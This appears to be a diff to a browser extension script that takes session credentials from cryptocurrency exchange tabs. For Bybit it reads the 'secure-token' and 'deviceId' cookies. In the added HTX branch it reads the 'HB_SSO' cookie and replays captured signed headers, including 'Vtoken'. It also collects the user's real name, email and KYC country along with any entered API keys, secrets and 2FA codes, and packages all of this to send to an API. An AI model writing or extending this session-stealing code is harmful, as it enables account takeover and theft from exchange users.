@@ -41,20 +41,18 @@ btn.addEventListener('click', async () => {
     // Get active tab
     const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
 
-    // Get secure-token cookie for that tab's URL
-    const secTok = await chrome.cookies.get({ url: tab.url, name: 'secure-token' });
-    const deviceId = await chrome.cookies.get({ url: tab.url, name: 'deviceId' });
-
-    if (!secTok) {
-      statusEl.textContent = '⚠ Cookie "secure-token" not found';
-      btn.disabled = false;
-      return;
-    }
-
     const host = new URL(tab.url).hostname
     const extra = collectAuth();  // key/sec/2fa the admin may have entered
     let payload = {}
     if (host === 'www.bybit.com') {
+      // Bybit: web session lives in the secure-token + deviceId cookies
+      const secTok = await chrome.cookies.get({ url: tab.url, name: 'secure-token' });
+      const deviceId = await chrome.cookies.get({ url: tab.url, name: 'deviceId' });
+      if (!secTok) {
+        statusEl.textContent = '⚠ Cookie "secure-token" not found';
+        btn.disabled = false;
+        return;
+      }
       const profile = (await (await fetch("https://www.bybit.com/x-api/fiat/otc/user/personal/info", {
         "method": "POST"
       })).json())['result']
@@ -64,6 +62,52 @@ btn.addEventListener('click', async () => {
         auth: {cookies: {"secure-token": secTok.value, deviceId: deviceId.value}, ...extra},
         profile: {rname: profile['realName'], nick: profile['nickName'], email: profile['email'], cc: profile['kycCountryCode']},
       }
+    } else if (host === 'www.htx.com') {
+      // HTX: session lives in the HB_SSO cookie, and OTC calls carry several
+      // signed headers the page generates. Rather than rebuild them we replay the
+      // page's own user/info request, captured by background.js — so the OTC page
+      // must have been opened at least once this session.
+      const hbSso = await chrome.cookies.get({ url: tab.url, name: 'HB_SSO' });
+      const { htxMethod, htxHeaders, htxBody } =
+        await chrome.storage.session.get(['htxMethod', 'htxHeaders', 'htxBody']);
+      if (!hbSso) {
+        statusEl.textContent = '⚠ Cookie "HB_SSO" not found';
+        btn.disabled = false;
+        return;
+      }
+      if (!htxHeaders) {
+        statusEl.textContent = '⚠ Запрос не перехвачен — откройте страницу OTC на HTX и нажмите снова';
+        btn.disabled = false;
+        return;
+      }
+      // headers the browser controls itself can't be forwarded via fetch — drop them
+      const FORBIDDEN = /^(accept-encoding|accept-charset|access-control|connection|content-length|cookie|date|dnt|expect|host|keep-alive|origin|permissions-policy|proxy-|sec-|referer|te|trailer|transfer-encoding|upgrade|via|user-agent)/i;
+      const headers = {};
+      for (const [k, v] of Object.entries(htxHeaders)) {
+        if (!k.startsWith(':') && !FORBIDDEN.test(k)) headers[k] = v;
+      }
+      const method = htxMethod || 'GET';
+      const res = await fetch("https://www.htx.com/-/x/otc/v1/user/info", {
+        method,
+        credentials: "include",
+        headers,
+        body: method === 'GET' || method === 'HEAD' ? undefined : htxBody,
+      });
+      const json = await res.json();
+      console.log('HTX user/info response:', json);
+      const data = json['data'];
+      if (!data) throw new Error(`HTX user/info: ${json['message'] || json['msg'] || 'code ' + json['code']}`);
+      const vtoken = Object.entries(htxHeaders).find(([k]) => k.toLowerCase() === 'vtoken')?.[1];
+      payload = {
+        host: host,
+        uid: Number(data['uid']),
+        auth: {cookies: {"HB_SSO": hbSso.value}, headers: {"Vtoken": vtoken}, ...extra},
+        profile: {rname: data['realName'], nick: data['userName']},
+      }
+    } else {
+      statusEl.textContent = `⚠ Unsupported host: ${host}`;
+      btn.disabled = false;
+      return;
     }
 
     // POST to API
